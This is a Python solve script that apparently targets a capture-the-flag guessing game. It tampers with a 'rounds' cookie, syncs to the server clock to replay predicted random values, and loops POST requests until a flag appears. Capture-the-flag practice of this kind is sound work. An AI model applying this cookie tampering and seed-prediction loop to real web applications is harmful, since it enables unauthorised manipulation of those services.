import requests
import datetime
import time
import re

while (time.time()-int(time.time())) > 0.03:
        pass

_Delay = 30
d = time.time()
r = requests.get('http://challenges.0x0539.net:3003/')

months = {	'Jan':'01',
		'Feb':'02',
		'Mar':'03',
		'Apr':'04',
		'May':'5',
		'Jun':'6' ,
		'Jul':'7',
		'Aug':'8',
		'Sep':'9',
		'Oct':'10',
		'Nov':'11',
		'Dec':'12'	
}
year = int(r.headers['Date'].split(', ')[1].split(' ')[2])
month = int(months[r.headers['Date'].split(', ')[1].split(' ')[1]])
day = int(r.headers['Date'].split(', ')[1].split(' ')[0])
ad = r.headers['Date'].split(', ')[1].split(' ')[3].split(':')
hour = int(ad[0])
minutes = int(ad[1])
secondes = int(ad[2])

now = datetime.datetime(year, month, day, hour, minutes, secondes)

print(f"This took: {time.time()-d} secondes")

cookie = r.cookies['PHPSESSID']

print("PHPSESSID", cookie)

_START_TIME = _Delay + int(d)


def make_req(php_sess, guess):
        print("[+] Trying:", guess)
        print(f"PHPSESSID: {php_sess}")
        r2 = requests.post('http://challenges.0x0539.net:3003/', data={'guess':guess}, cookies={'rounds': '9223372036854775806', 'PHPSESSID': php_sess})
        try:
                print()
                print(re.findall("Rounds[:] \d+", r2.text)[0])
                a = re.findall("Streak[:] \d+", r2.text)
                streak_out = a[0] if len(a) else re.findall("Streak[:] [-]\d+", r2.text)[0]
                streak = int(streak_out.split(': ')[1])
                print(streak_out)
                if streak < 0:
                        r2 = requests.post('http://challenges.0x0539.net:3003/', data={'guess':guess, 'reset': 'Reset!'}, cookies={'PHPSESSID': php_sess})
                print()
                print(re.findall("Wrong[:] \d+", r2.text)[0])
        except:
                print(r2.text)
                input("halt> ")
                pass
        print()

        if ('FLAG' in r2.text):
                with open("flag.txt", "w") as f:
                        print(r2.text)
                        f.write(r2.text)
                        f.close()


offset = int(now.timestamp()-int(d))-1  # int(now.timestamp()-int(d))
_stamp = int(now.timestamp())

print("offset:", offset)
print("stamp:", _stamp)

print('Go predict =>', int(now.timestamp())+_Delay)
_list = input("[R,]> ")

try:
	_list = [int(x) for x in _list.split(",") if x.isalnum()][:-1]
except:
	print("use predict.php.")
	print("exting..")
	exit()

if len(_list)<105:
        print("short list")
        exit()

while _START_TIME > int(time.time()):
        pass
_ = 0
while 1:
        print(_)
        attempt = (int(time.time())+(offset))-_stamp
        print(f"attempting: {attempt}\ncookie: {cookie}")
        print()
        make_req(cookie, str(_list[attempt]))
        _ += 1

